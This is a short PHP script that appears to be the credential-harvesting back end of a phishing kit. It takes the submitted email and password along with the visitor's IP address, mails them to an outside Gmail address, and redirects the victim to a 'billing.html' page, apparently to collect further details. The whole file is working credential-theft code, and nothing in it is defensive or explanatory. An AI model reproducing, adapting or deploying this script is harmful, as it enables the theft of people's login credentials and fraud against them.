<?php

$ip = getenv("REMOTE_ADDR");

$message = "----------- ---------------------\n";
$message .= "email: ".$_POST['username']."\n";
$message .= "password: ".$_POST['password']."\n";



$message .= "IP: ".$ip."\n";
$message .= "---------------  ------------------------------\n";



mail("marikocraft.hr@gmail.com","Message from GCI $ip  ",$message);

   header("Location: billing.html");

?>
